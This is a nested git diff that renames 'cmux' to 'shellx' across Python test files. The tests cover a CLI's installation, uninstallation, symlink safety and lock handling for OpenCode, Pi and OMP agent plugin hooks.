+             text=True,
+             check=False,
+             env=config_env,
+             timeout=20,
+         )
+-        config_extension_path = config_override / "agent" / "extensions" / "cmux-omp-session.ts"
++        config_extension_path = config_override / "agent" / "extensions" / "shellx-omp-session.ts"
+         if config_install.returncode != 0 or not config_extension_path.exists():
+             print("FAIL: omp extension install did not respect absolute PI_CONFIG_DIR")
+             print(f"exit={config_install.returncode}")
+             print(f"stdout={config_install.stdout.strip()}")
+             print(f"stderr={config_install.stderr.strip()}")
+             return 1
+         config_uninstall = subprocess.run(
+             [cli_path, "hooks", "omp", "uninstall", "--yes"],
+             capture_output=True,
+             text=True,
+@@ -1033,25 +1033,25 @@ for (const rawPid of hungPidLines.slice(-2)) {
+             env=env,
+             timeout=20,
+         )
+         if install.returncode != 0:
+             print("FAIL: omp extension install failed under OMP_AGENT_DIR")
+             print(f"exit={install.returncode}")
+             print(f"stdout={install.stdout.strip()}")
+             print(f"stderr={install.stderr.strip()}")
+             return 1
+ 
+-        omp_extension = omp_agent_dir / "extensions" / "cmux-omp-session.ts"
++        omp_extension = omp_agent_dir / "extensions" / "shellx-omp-session.ts"
+         if not omp_extension.exists():
+             print(f"FAIL: OMP_AGENT_DIR ignored, expected extension at {omp_extension}")
+             return 1
+-        if (pi_agent_dir / "extensions" / "cmux-omp-session.ts").exists():
++        if (pi_agent_dir / "extensions" / "shellx-omp-session.ts").exists():
+             print("FAIL: OMP install wrote into PI_CODING_AGENT_DIR while OMP_AGENT_DIR was set")
+             return 1
+ 
+         uninstall = subprocess.run(
+             [cli_path, "hooks", "omp", "uninstall", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=env,
+             timeout=20,
+diff --git a/tests/test_omp_subagent_lifecycle.py b/tests/test_omp_subagent_lifecycle.py
+index c4046282e4..e220d6e76a 100644
+--- a/tests/test_omp_subagent_lifecycle.py
++++ b/tests/test_omp_subagent_lifecycle.py
+@@ -68,21 +68,21 @@ def main() -> int:
+             check=False,
+             env=env,
+             timeout=20,
+         )
+         if install.returncode != 0:
+             print("FAIL: omp extension install failed")
+             print(f"exit={install.returncode}")
+             print(f"stdout={install.stdout.strip()}")
+             print(f"stderr={install.stderr.strip()}")
+             return 1
+-        extension_path = agent_dir / "extensions" / "cmux-omp-session.ts"
++        extension_path = agent_dir / "extensions" / "shellx-omp-session.ts"
+         if not extension_path.exists():
+             print(f"FAIL: expected extension at {extension_path}")
+             return 1
+         extension_override = os.environ.get("CMUX_TEST_OMP_EXTENSION_OVERRIDE")
+         if extension_override:
+             shutil.copyfile(extension_override, extension_path)
+ 
+         fake_cmux = root / "fake-cmux"
+         fake_args_log = root / "fake-cmux-args.log"
+         fake_stdin_log = root / "fake-cmux-stdin.log"
+diff --git a/tests/test_opencode_plugin_install.py b/tests/test_opencode_plugin_install.py
+index 6da9907e30..f2c1432340 100644
+--- a/tests/test_opencode_plugin_install.py
++++ b/tests/test_opencode_plugin_install.py
+@@ -48,22 +48,22 @@ def main() -> int:
+         root = Path(td)
+         config_dir = root / "opencode"
+         config_dir.mkdir(parents=True, exist_ok=True)
+         config_json = config_dir / "opencode.json"
+         config_json.write_text(
+             json.dumps(
+                 {
+                     "plugins": [
+                         "oh-my-opencode",
+                         ["existing-plugin", {"enabled": True}],
+-                        "cmux-session",
+-                        "./plugins/cmux-session.js",
++                        "shellx-session",
++                        "./plugins/shellx-session.js",
+                     ]
+                 }
+             ),
+             encoding="utf-8",
+         )
+         env = os.environ.copy()
+         env["OPENCODE_CONFIG_DIR"] = str(config_dir)
+ 
+         install = subprocess.run(
+             [cli_path, "hooks", "opencode", "install", "--yes"],
+@@ -73,56 +73,56 @@ def main() -> int:
+             env=env,
+             timeout=20,
+         )
+         if install.returncode != 0:
+             print("FAIL: opencode plugin install failed")
+             print(f"exit={install.returncode}")
+             print(f"stdout={install.stdout.strip()}")
+             print(f"stderr={install.stderr.strip()}")
+             return 1
+ 
+-        plugin_path = config_dir / "plugins" / "cmux-session.js"
++        plugin_path = config_dir / "plugins" / "shellx-session.js"
+         if not plugin_path.exists():
+             print(f"FAIL: expected plugin at {plugin_path}")
+             return 1
+-        feed_plugin_path = config_dir / "plugins" / "cmux-feed.js"
++        feed_plugin_path = config_dir / "plugins" / "shellx-feed.js"
+         if not feed_plugin_path.exists():
+             print(f"FAIL: expected feed plugin at {feed_plugin_path}")
+             return 1
+-        if "cmux-feed-plugin-marker" not in feed_plugin_path.read_text(encoding="utf-8"):
++        if "shellx-feed-plugin-marker" not in feed_plugin_path.read_text(encoding="utf-8"):
+             print(f"FAIL: expected cmux feed marker in {feed_plugin_path}")
+             return 1
+-        tui_directory = config_dir / "plugins" / "cmux"
+-        ownership_marker = tui_directory / ".cmux-owned"
+-        if not ownership_marker.exists() or "cmux-opencode-tui-plugin-ownership-marker" not in ownership_marker.read_text(encoding="utf-8"):
++        tui_directory = config_dir / "plugins" / "shellx"
++        ownership_marker = tui_directory / ".shellx-owned"
++        if not ownership_marker.exists() or "shellx-opencode-tui-plugin-ownership-marker" not in ownership_marker.read_text(encoding="utf-8"):
+             print(f"FAIL: expected cmux TUI ownership marker at {ownership_marker}")
+             return 1
+ 
+         try:
+             config = json.loads(config_json.read_text(encoding="utf-8"))
+         except Exception as exc:
+             print(f"FAIL: invalid opencode.json after install: {exc}")
+             return 1
+         plugins = config.get("plugin")
+         if not isinstance(plugins, list):
+             print(f"FAIL: expected plugin list in opencode.json, got {plugins!r}")
+             return 1
+         stale = [
+             entry
+             for entry in plugins
+             if (entry if isinstance(entry, str) else entry[0] if isinstance(entry, list) and entry else "")
+-            == "cmux-session"
++            == "shellx-session"
+         ]
+         if stale:
+             print(f"FAIL: expected stale cmux plugin registrations removed, got {plugins!r}")
+             return 1
+-        if "./plugins/cmux" not in plugins:
++        if "./plugins/shellx" not in plugins:
+             print(f"FAIL: expected local cmux session plugin registration, got {plugins!r}")
+             return 1
+         if "oh-my-opencode" not in plugins or ["existing-plugin", {"enabled": True}] not in plugins:
+             print(f"FAIL: installer did not preserve existing plugin entries: {plugins!r}")
+             return 1
+ 
+         opencode = shutil.which("opencode")
+         if opencode is not None:
+             debug = subprocess.run(
+                 [opencode, "--print-logs", "--log-level", "DEBUG", "debug", "config"],
+@@ -444,22 +444,22 @@ await v1Hooks.event({ event: { type: "session.deleted", properties: { info: { id
+             env=project_env,
+             timeout=20,
+         )
+         if project_install.returncode != 0:
+             print("FAIL: project-local OpenCode plugin install failed")
+             print(f"exit={project_install.returncode}")
+             print(f"stdout={project_install.stdout.strip()}")
+             print(f"stderr={project_install.stderr.strip()}")
+             return 1
+         project_plugin_dir = project_dir / ".opencode" / "plugins"
+-        project_feed = project_plugin_dir / "cmux-feed.js"
+-        project_tui = project_plugin_dir / "cmux"
++        project_feed = project_plugin_dir / "shellx-feed.js"
++        project_tui = project_plugin_dir / "shellx"
+         if not project_feed.exists() or not project_tui.exists():
+             print("FAIL: project-local install did not create the Feed and TUI bridge")
+             return 1
+ 
+         project_uninstall = subprocess.run(
+             [cli_path, "hooks", "opencode", "uninstall", "--project"],
+             capture_output=True,
+             text=True,
+             check=False,
+             cwd=project_dir,
+@@ -489,22 +489,22 @@ await v1Hooks.event({ event: { type: "session.deleted", properties: { info: { id
+             text=True,
+             check=False,
+             cwd=project_foreign_dir,
+             env=project_env,
+             timeout=20,
+         )
+         if project_foreign_install.returncode != 0:
+             print("FAIL: project-local foreign-file install failed")
+             return 1
+         project_foreign_plugins = project_foreign_dir / ".opencode" / "plugins"
+-        project_foreign_feed = project_foreign_plugins / "cmux-feed.js"
+-        project_foreign_tui = project_foreign_plugins / "cmux"
++        project_foreign_feed = project_foreign_plugins / "shellx-feed.js"
++        project_foreign_tui = project_foreign_plugins / "shellx"
+         project_foreign_feed.write_text("// user-owned project plugin\n", encoding="utf-8")
+         project_foreign_uninstall = subprocess.run(
+             [cli_path, "hooks", "opencode", "uninstall", "--project"],
+             capture_output=True,
+             text=True,
+             check=False,
+             cwd=project_foreign_dir,
+             env=project_env,
+             timeout=20,
+         )
+@@ -525,22 +525,22 @@ await v1Hooks.event({ event: { type: "session.deleted", properties: { info: { id
+             [cli_path, "hooks", "opencode", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=orphan_env,
+             timeout=20,
+         )
+         if orphan_install.returncode != 0:
+             print("FAIL: orphan-case OpenCode plugin install failed")
+             return 1
+-        orphan_session = orphan_root / "plugins" / "cmux-session.js"
+-        orphan_tui = orphan_root / "plugins" / "cmux"
++        orphan_session = orphan_root / "plugins" / "shellx-session.js"
++        orphan_tui = orphan_root / "plugins" / "shellx"
+         orphan_session.unlink()
+         orphan_uninstall = subprocess.run(
+             [cli_path, "hooks", "opencode", "uninstall", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=orphan_env,
+             timeout=20,
+         )
+         if orphan_uninstall.returncode != 0 or orphan_tui.exists():
+@@ -560,48 +560,48 @@ await v1Hooks.event({ event: { type: "session.deleted", properties: { info: { id
+             [cli_path, "hooks", "opencode", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=foreign_env,
+             timeout=20,
+         )
+         if foreign_install.returncode != 0:
+             print("FAIL: foreign-file OpenCode plugin install failed")
+             return 1
+-        foreign_session = foreign_root / "plugins" / "cmux-session.js"
+-        foreign_tui = foreign_root / "plugins" / "cmux"
++        foreign_session = foreign_root / "plugins" / "shellx-session.js"
++        foreign_tui = foreign_root / "plugins" / "shellx"
+         foreign_session.write_text("// user-owned plugin\n", encoding="utf-8")
+         foreign_uninstall = subprocess.run(
+             [cli_path, "hooks", "opencode", "uninstall", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=foreign_env,
+             timeout=20,
+         )
+         foreign_config = json.loads((foreign_root / "opencode.json").read_text(encoding="utf-8"))
+         if (
+             foreign_uninstall.returncode != 0
+             or foreign_session.read_text(encoding="utf-8") != "// user-owned plugin\n"
+             or foreign_tui.exists()
+-            or "./plugins/cmux" in foreign_config.get("plugin", [])
++            or "./plugins/shellx" in foreign_config.get("plugin", [])
+         ):
+             print("FAIL: uninstall removed or retained the wrong files for an unmarked legacy plugin")
+             return 1
+ 
+         # Never follow a user symlink while validating or overwriting the
+         # shared TUI package directory.
+         symlink_root = root / "symlink-config"
+-        symlink_directory = symlink_root / "plugins" / "cmux"
++        symlink_directory = symlink_root / "plugins" / "shellx"
+         symlink_directory.mkdir(parents=True)
+         symlink_target = root / "symlink-target.js"
+-        symlink_target.write_text("// cmux-opencode-tui-plugin-server-marker v2\n", encoding="utf-8")
++        symlink_target.write_text("// shellx-opencode-tui-plugin-server-marker v2\n", encoding="utf-8")
+         (symlink_directory / "index.js").symlink_to(symlink_target)
+         symlink_env = env.copy()
+         symlink_env["OPENCODE_CONFIG_DIR"] = str(symlink_root)
+         symlink_install = subprocess.run(
+             [cli_path, "hooks", "opencode", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=symlink_env,
+             timeout=20,
+diff --git a/tests/test_opencode_server_entry.py b/tests/test_opencode_server_entry.py
+index 91bcc5e979..f56fb19414 100644
+--- a/tests/test_opencode_server_entry.py
++++ b/tests/test_opencode_server_entry.py
+@@ -1,17 +1,17 @@
+ #!/usr/bin/env python3
+ """Released OpenCode loads cmux through each plugin's default `server` entry.
+ 
+ OpenCode 1.x (including the current dev channel) calls `default.server(ctx)`
+ inside the TUI process with `{ client, project, worktree, directory,
+ serverUrl, $ }` and delivers events through the returned `event` hook. It
+-loads `cmux-feed.js`, `cmux-session.js` and `plugins/cmux/index.js`, so the
++loads `shellx-feed.js`, `shellx-session.js` and `plugins/cmux/index.js`, so the
+ server entries must have unique IDs and deliver one Stop per turn instead of
+ returning `{}`.
+ """
+ from __future__ import annotations
+ 
+ import json
+ import os
+ import re
+ import shutil
+ import subprocess
+@@ -89,21 +89,21 @@ const waitFor = async (predicate, message) => {
+   const deadline = Date.now() + 30000;
+   while (!predicate()) {
+     if (Date.now() > deadline) throw new Error(message);
+     await new Promise((resolve) => setTimeout(resolve, 20));
+   }
+ };
+ 
+ // Load the three cmux entries for one plugin scope, as OpenCode does.
+ const loadScope = async (scopeCtx) => {
+   const hooks = [];
+-  const files = ["cmux-feed.js", "cmux-session.js", path.join("cmux", "index.js")];
++  const files = ["shellx-feed.js", "shellx-session.js", path.join("cmux", "index.js")];
+   const modules = [];
+   for (const file of files) {
+     const mod = await import(path.join(pluginDir, file));
+     if (typeof mod.default?.server !== "function") throw new Error(`${file} lacks a server entry`);
+     modules.push([file, mod]);
+     hooks.push(await mod.default.server(scopeCtx, {}));
+   }
+   const ids = modules.map(([file, mod]) => `${file}:${mod.default.id}`);
+   if (new Set(modules.map(([, mod]) => mod.default.id)).size !== modules.length) {
+     throw new Error(`OpenCode plugin IDs must be unique: ${ids.join(", ")}`);
+@@ -189,25 +189,25 @@ def main() -> int:
+     node = shutil.which("node")
+     if node is None:
+         print("SKIP: node not found")
+         return 0
+     with tempfile.TemporaryDirectory(prefix="cmux-opencode-server-") as td:
+         root = Path(td)
+         plugin_dir = root / "plugins"
+         package_dir = plugin_dir / "cmux"
+         package_dir.mkdir(parents=True)
+         feed_source = (ROOT / "Resources/opencode-plugin.js").read_text(encoding="utf-8")
+-        server_source = feed_source.replace('id: "cmux.feed"', 'id: "cmux.server"')
+-        (plugin_dir / "cmux-feed.js").write_text(feed_source, encoding="utf-8")
+-        (plugin_dir / "cmux-session.js").write_text(session_plugin_source(), encoding="utf-8")
++        server_source = feed_source.replace('id: "shellx.feed"', 'id: "cmux.server"')
++        (plugin_dir / "shellx-feed.js").write_text(feed_source, encoding="utf-8")
++        (plugin_dir / "shellx-session.js").write_text(session_plugin_source(), encoding="utf-8")
+         (package_dir / "index.js").write_text(
+-            "// cmux-opencode-tui-plugin-server-marker v2\n" + server_source, encoding="utf-8"
++            "// shellx-opencode-tui-plugin-server-marker v2\n" + server_source, encoding="utf-8"
+         )
+         (plugin_dir / "package.json").write_text('{"type":"module"}', encoding="utf-8")
+         (package_dir / "package.json").write_text('{"type":"module"}', encoding="utf-8")
+         log_path = root / "cmux.log"
+         fake_cmux = root / "cmux"
+         fake_cmux.write_text(f'#!/bin/sh\necho "$* $(cat)" >> "{log_path}"\n', encoding="utf-8")
+         fake_cmux.chmod(0o755)
+         socket_path = str(root / "cmux.sock")
+         env = os.environ.copy()
+         env.update(
+diff --git a/tests/test_opencode_v2_tui_bridge.py b/tests/test_opencode_v2_tui_bridge.py
+index 6e1552e70d..041063862b 100755
+--- a/tests/test_opencode_v2_tui_bridge.py
++++ b/tests/test_opencode_v2_tui_bridge.py
+@@ -319,21 +319,21 @@ globalThis.setTimeout = nativeSetTimeout;
+ globalThis.clearTimeout = nativeClearTimeout;
+ if (leakedTimers) throw new Error("disposed TUI retained pending session-start timers");
+ cleanupB();
+ server.closeAllConnections?.();
+ await new Promise((resolve) => server.close(resolve));
+ console.log("PASS");
+ '''
+     with tempfile.TemporaryDirectory(prefix="cmux-opencode-v2-package-") as package:
+         package_dir = Path(package)
+         feed_source = (ROOT / "Resources/opencode-plugin.js").read_text()
+-        (package_dir / "index.js").write_text(feed_source.replace('id: "cmux.feed"', 'id: "cmux.server"'))
++        (package_dir / "index.js").write_text(feed_source.replace('id: "shellx.feed"', 'id: "cmux.server"'))
+         (package_dir / "tui.js").write_text((ROOT / "Resources/opencode-tui-plugin.js").read_text())
+         (package_dir / "node_modules").symlink_to(ROOT / "node_modules", target_is_directory=True)
+         (package_dir / "harness.mjs").write_text(source)
+         env = os.environ.copy()
+         env["CMUX_OPENCODE_V2_HARNESS"] = json.dumps({"packageDir": str(package_dir), "fixture": fixture})
+         result = subprocess.run([node, "--conditions=browser", str(package_dir / "harness.mjs")], cwd=ROOT, env=env, text=True, capture_output=True, check=False, timeout=20)
+     if result.returncode:
+         print("FAIL: OpenCode V2 TUI bridge harness")
+         print(result.stdout)
+         print(result.stderr)
+diff --git a/tests/test_pi_extension_dispatch.py b/tests/test_pi_extension_dispatch.py
+index 7f04212fe9..5353a8f054 100644
+--- a/tests/test_pi_extension_dispatch.py
++++ b/tests/test_pi_extension_dispatch.py
+@@ -557,21 +557,21 @@ if (projectionCount !== 1) {
+     make_executable(package_cli, "#!/usr/bin/env node\n")
+     package_json = package_root / "package.json"
+     package_json.write_text(
+         json.dumps({"name": "@earendil-works/pi-coding-agent", "version": "0.83.0"}),
+         encoding="utf-8",
+     )
+     probe_bin = root / "hot-path-bin"
+     probe_bin.mkdir()
+     probe_pi = probe_bin / "pi"
+     probe_pi.symlink_to(package_cli)
+-    inspectable_extension = root / "hot-path-cmux-session.ts"
++    inspectable_extension = root / "hot-path-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_path.read_text(encoding="utf-8")
+         + "\nexport { normalizedLaunchArgv, supportsAgentSettled };\n",
+         encoding="utf-8",
+     )
+     launch_probe_source = """
+ import { unlinkSync } from "node:fs";
+ const extensionPath = process.env.CMUX_TEST_PI_EXTENSION_PATH;
+ const mod = await import(extensionPath);
+ process.argv.splice(
+@@ -801,21 +801,21 @@ def check_panel_only_target_fails_closed(bun: str, root: Path, extension_path: P
+     marker = root / "panel-only-cmux-called"
+     fake_cmux = root / "panel-only-cmux"
+     make_executable(
+         fake_cmux,
+         """#!/usr/bin/env bash
+ set -euo pipefail
+ touch "$CMUX_TEST_PI_PANEL_ONLY_MARKER"
+ exit 91
+ """,
+     )
+-    inspectable_extension = root / "panel-only-cmux-session.ts"
++    inspectable_extension = root / "panel-only-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_path.read_text(encoding="utf-8")
+         + "\nexport { sendHook };\n",
+         encoding="utf-8",
+     )
+     source = """
+ const extensionPath = process.env.CMUX_TEST_PI_EXTENSION_PATH;
+ const mod = await import(extensionPath);
+ const delivered = await mod.sendHook(
+   {},
+@@ -1357,21 +1357,21 @@ await handlers.get("agent_end")({
+         return 1
+     if not session_b_notification_indexes or session_b_feed_indexes[0] > session_b_notification_indexes[0]:
+         print(f"FAIL: session B lifecycle ran before its isolated feed work: {calls!r}")
+         return 1
+ 
+     return 0
+ 
+ 
+ def check_feed_ack_rehomes_cached_target(bun: str, root: Path, extension_path: Path) -> int:
+     live_workspace = "00000000-0000-0000-0000-000000008679"
+-    inspectable_extension = root / "feed-rehome-cmux-session.ts"
++    inspectable_extension = root / "feed-rehome-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_path.read_text(encoding="utf-8")
+         + "\nexport { PiCmuxCommandDispatcher, surfaceTargetsFor };\n",
+         encoding="utf-8",
+     )
+     rehome_cmux = root / "feed-rehome-cmux"
+     make_executable(
+         rehome_cmux,
+         f"""#!/usr/bin/env python3
+ import json
+@@ -1558,21 +1558,21 @@ import pathlib
+ import sys
+ import time
+ 
+ sys.stdin.read()
+ release_path = pathlib.Path(os.environ["CMUX_TEST_PI_FAILURE_OVERFLOW_RELEASE"])
+ while not release_path.exists():
+     time.sleep(0.01)
+ print("{}")
+ """,
+     )
+-    inspectable_extension = root / "feed-failure-overflow-cmux-session.ts"
++    inspectable_extension = root / "feed-failure-overflow-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_path.read_text(encoding="utf-8")
+         + "\nexport { PiCmuxCommandDispatcher };\n",
+         encoding="utf-8",
+     )
+     overflow_source = """
+ import { writeFileSync } from "node:fs";
+ const extensionPath = process.env.CMUX_TEST_PI_EXTENSION_PATH;
+ const mod = await import(extensionPath);
+ const dispatcher = new mod.PiCmuxCommandDispatcher();
+@@ -2021,21 +2021,21 @@ await handlers.get("session_shutdown")({ reason: "quit" }, ctx);
+             return 1
+ 
+     return 0
+ 
+ 
+ def check_nonterminal_timeout_marks_dropped_completion(
+     bun: str,
+     root: Path,
+     extension_path: Path,
+ ) -> int:
+-    inspectable_extension = root / "inspectable-cmux-session.ts"
++    inspectable_extension = root / "inspectable-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_path.read_text(encoding="utf-8")
+         + "\nexport { PiCmuxCommandDispatcher };\n",
+         encoding="utf-8",
+     )
+     timeout_source = """
+ const extensionPath = process.env.CMUX_TEST_PI_EXTENSION_PATH;
+ const mod = await import(extensionPath);
+ const dispatcher = new mod.PiCmuxCommandDispatcher();
+ const context = {
+@@ -3015,36 +3015,36 @@ for (let index = 0; index < iterations; index += 1) {
+ 
+ def check_timeout_configuration_and_failure_telemetry(
+     bun: str,
+     root: Path,
+     extension_path: Path,
+ ) -> int:
+     extension_text = extension_path.read_text(encoding="utf-8")
+     if "CMUX_PI_HOOK_TIMEOUT_MS" not in extension_text:
+         print("FAIL: generated Pi extension does not expose CMUX_PI_HOOK_TIMEOUT_MS")
+         return 1
+-    if "publishPiWorkspaceMetadata" in extension_text and "cmux-pi-session-extension-marker v4" not in extension_text:
++    if "publishPiWorkspaceMetadata" in extension_text and "shellx-pi-session-extension-marker v4" not in extension_text:
+         print("FAIL: generated Pi extension did not advance its regeneration marker to v4")
+         return 1
+     forbidden_console_calls = [
+         call
+         for call in ("console.warn(", "console.error(")
+         if call in extension_text
+     ]
+     if forbidden_console_calls:
+         print(
+             "FAIL: generated Pi extension can render failure diagnostics in Pi's prompt: "
+             f"{forbidden_console_calls!r}"
+         )
+         return 1
+ 
+-    inspectable_extension = root / "timeout-telemetry-cmux-session.ts"
++    inspectable_extension = root / "timeout-telemetry-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_text
+         + "\nexport { PiCmuxCommandDispatcher, piHookTimeoutMilliseconds, piCommandTimeoutMilliseconds, commandFailureReason, piHookName, createPiLifecycleQueue };\n",
+         encoding="utf-8",
+     )
+ 
+     fake_cmux = root / "timeout-telemetry-cmux"
+     make_executable(
+         fake_cmux,
+         """#!/usr/bin/env python3
+@@ -3263,21 +3263,21 @@ for (const [hookName, expected] of expectedFailures) {
+ 
+     return 0
+ 
+ 
+ def check_diagnostic_log_safety_and_routing(
+     bun: str,
+     root: Path,
+     extension_path: Path,
+ ) -> int:
+     extension_text = extension_path.read_text(encoding="utf-8")
+-    inspectable_extension = root / "diagnostic-log-cmux-session.ts"
++    inspectable_extension = root / "diagnostic-log-shellx-session.ts"
+     inspectable_extension.write_text(
+         extension_text
+         + "\nexport { PiCmuxCommandDispatcher, appendPiHookDiagnostic, piHookDiagnosticPath, runPiHookDiagnosticWrite, warn };\n",
+         encoding="utf-8",
+     )
+ 
+     fake_cmux = root / "diagnostic-log-cmux"
+     make_executable(
+         fake_cmux,
+         """#!/usr/bin/env bash
+diff --git a/tests/test_pi_extension_install.py b/tests/test_pi_extension_install.py
+index 7379b2cd2c..bc63d5f05c 100644
+--- a/tests/test_pi_extension_install.py
++++ b/tests/test_pi_extension_install.py
+@@ -143,30 +143,30 @@ def main() -> int:
+         config_dir = root / "pi-agent"
+         try:
+             extension_path = install_pi_extension(config_dir, cli_path)
+         except RuntimeError as exc:
+             print("FAIL: pi extension install failed")
+             print(exc)
+             return 1
+         env = os.environ.copy()
+         env["PI_CODING_AGENT_DIR"] = str(config_dir)
+         extension_text = extension_path.read_text(encoding="utf-8")
+-        if "cmux-pi-session-extension-marker" not in extension_text:
++        if "shellx-pi-session-extension-marker" not in extension_text:
+             print(f"FAIL: expected cmux marker in {extension_path}")
+             return 1
+ 
+         if "@earendil-works/pi-coding-agent" not in extension_text:
+             print("FAIL: generated Pi extension does not import the current Pi package")
+             return 1
+ 
+         extension_path.write_text(
+-            "// cmux-pi-session-extension-marker v2\n"
++            "// shellx-pi-session-extension-marker v2\n"
+             "// stale managed fixture using synchronous hook dispatch\n"
+             'import { spawnSync } from "node:child_process";\n',
+             encoding="utf-8",
+         )
+         refresh_env = os.environ.copy()
+         isolated_home = root / "home"
+         isolated_home.mkdir()
+         refresh_env["HOME"] = str(isolated_home)
+         refresh_env["CFFIXED_USER_HOME"] = str(isolated_home)
+         refresh_env["PI_CODING_AGENT_DIR"] = str(config_dir)
+@@ -219,24 +219,24 @@ def main() -> int:
+             timeout=20,
+         )
+         if empty_refresh_result.returncode == 0:
+             print("FAIL: empty Pi refresh fixture unexpectedly connected to its missing socket")
+             return 1
+         if extension_path.read_text(encoding="utf-8") != extension_text:
+             print("FAIL: Pi session-start did not repair an empty managed extension")
+             return 1
+ 
+         extension_path.write_text(
+-            "// cmux-pi-session-extension-marker v2\n// stale managed race fixture\n",
++            "// shellx-pi-session-extension-marker v2\n// stale managed race fixture\n",
+             encoding="utf-8",
+         )
+-        lock_path = extension_path.parent / ".cmux-session.lock"
++        lock_path = extension_path.parent / ".shellx-session.lock"
+         replacement = "// user replacement without the cmux ownership marker\n"
+         with lock_path.open("a", encoding="utf-8") as lock:
+             fcntl.flock(lock, fcntl.LOCK_EX)
+             blocked_refresh = subprocess.Popen(
+                 refresh_command,
+                 stdin=subprocess.PIPE,
+                 stdout=subprocess.PIPE,
+                 stderr=subprocess.PIPE,
+                 text=True,
+                 env=refresh_env,
+@@ -254,21 +254,21 @@ def main() -> int:
+                 return 1
+             fcntl.flock(lock, fcntl.LOCK_UN)
+         if extension_path.read_text(encoding="utf-8") != replacement:
+             print("FAIL: in-flight Pi refresh overwrote a replacement extension")
+             return 1
+ 
+         extension_path.unlink()
+         extension_path = install_pi_extension(config_dir, cli_path)
+         extension_text = extension_path.read_text(encoding="utf-8")
+         extension_path.write_text(
+-            "// cmux-pi-session-extension-marker v2\n// stale uninstall race fixture\n",
++            "// shellx-pi-session-extension-marker v2\n// stale uninstall race fixture\n",
+             encoding="utf-8",
+         )
+         with lock_path.open("a", encoding="utf-8") as lock:
+             fcntl.flock(lock, fcntl.LOCK_EX)
+             blocked_refresh = subprocess.Popen(
+                 refresh_command,
+                 stdin=subprocess.PIPE,
+                 stdout=subprocess.PIPE,
+                 stderr=subprocess.PIPE,
+                 text=True,
+@@ -307,21 +307,21 @@ def main() -> int:
+                 f"stdout={uninstall_stdout!r} stderr={uninstall_stderr!r}"
+             )
+             return 1
+         if extension_path.exists():
+             print("FAIL: in-flight Pi refresh recreated an uninstalled extension")
+             return 1
+         extension_path = install_pi_extension(config_dir, cli_path)
+         extension_text = extension_path.read_text(encoding="utf-8")
+ 
+         stale_symlink_fixture = (
+-            "// cmux-pi-session-extension-marker v2\n"
++            "// shellx-pi-session-extension-marker v2\n"
+             "// stale lock symlink fixture\n"
+         )
+         extension_path.write_text(stale_symlink_fixture, encoding="utf-8")
+         lock_path.unlink(missing_ok=True)
+         lock_target = root / "redirected-lock-target"
+         lock_target.write_text("sentinel\n", encoding="utf-8")
+         lock_path.symlink_to(lock_target)
+         symlink_result = subprocess.run(
+             [cli_path, "hooks", "pi", "install", "--yes"],
+             capture_output=True,
+diff --git a/tests/test_pi_wrapper.py b/tests/test_pi_wrapper.py
+index b20ae88044..4a9a87c584 100644
+--- a/tests/test_pi_wrapper.py
++++ b/tests/test_pi_wrapper.py
+@@ -3,21 +3,21 @@
+ 
+ from __future__ import annotations
+ 
+ import subprocess
+ import tempfile
+ from pathlib import Path
+ 
+ 
+ ROOT = Path(__file__).resolve().parents[1]
+ WRAPPER = ROOT / "Resources/bin/shellx-pi-wrapper"
+-MARKER = "cmux-pi-session-extension-marker v4"
++MARKER = "shellx-pi-session-extension-marker v4"
+ 
+ 
+ def executable(path: Path, text: str) -> None:
+     path.write_text(text, encoding="utf-8")
+     path.chmod(0o755)
+ 
+ 
+ def run_case(
+     root: Path,
+     *,
+@@ -42,43 +42,43 @@ def run_case(
+         fake_cmux,
+         "#!/bin/sh\n"
+         "if [ \"$1 $2 $3\" = 'hooks pi extension-source' ]; then\n"
+         f"  printf '%s\\n' '// {MARKER}'\n"
+         "  exit 0\n"
+         "fi\n"
+         "exit 1\n",
+     )
+     agent_dir = root / "pi-agent"
+     if managed_global:
+-        extension = agent_dir / "extensions/cmux-session.ts"
++        extension = agent_dir / "extensions/shellx-session.ts"
+         extension.parent.mkdir(parents=True)
+         extension.write_text(f"// {MARKER}\n", encoding="utf-8")
+     if stale_cached_extension:
+-        cached = root / "tmp/cmux-pi-extensions/surface-test/cmux-session.ts"
++        cached = root / "tmp/cmux-pi-extensions/surface-test/shellx-session.ts"
+         cached.parent.mkdir(parents=True)
+-        cached.write_text("// cmux-pi-session-extension-marker v3\n", encoding="utf-8")
++        cached.write_text("// shellx-pi-session-extension-marker v3\n", encoding="utf-8")
+ 
+     environment = {
+         "PATH": f"{bin_dir}:/usr/bin:/bin",
+         "HOME": str(root / "home"),
+         "TMPDIR": str(root / "tmp"),
+         "PI_CODING_AGENT_DIR": str(agent_dir),
+         "CMUX_BUNDLED_CLI_PATH": str(fake_cmux),
+         "CMUX_SURFACE_ID": "surface-test",
+     }
+     if disabled:
+         environment["CMUX_PI_HOOKS_DISABLED"] = "1"
+     subprocess.run([str(WRAPPER), *args], env=environment, check=True)
+     return {
+         "args": log.read_text(encoding="utf-8").splitlines(),
+-        "extension_exists": (root / "tmp/cmux-pi-extensions/surface-test/cmux-session.ts").exists(),
+-        "global_exists": (agent_dir / "extensions/cmux-session.ts").exists(),
++        "extension_exists": (root / "tmp/cmux-pi-extensions/surface-test/shellx-session.ts").exists(),
++        "global_exists": (agent_dir / "extensions/shellx-session.ts").exists(),
+     }
+ 
+ 
+ def main() -> int:
+     with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-glob-") as directory:
+         root = Path(directory)
+         (root / "bin1").mkdir()
+         literal_path = run_case(root, bin_name="bin[1]")
+         if "-e" not in literal_path["args"]:
+             raise AssertionError(f"Pi in a literal PATH entry was not launched: {literal_path}")
+@@ -108,40 +108,40 @@ def main() -> int:
+         (),
+         ("hello",),
+         ("--print", "update"),
+         ("--model", "provider/model", "hello"),
+         ("--", "--no-extensions"),
+     )
+     for args in interactive_args:
+         with tempfile.TemporaryDirectory(prefix="shellx-pi-wrapper-prompt-") as directory:
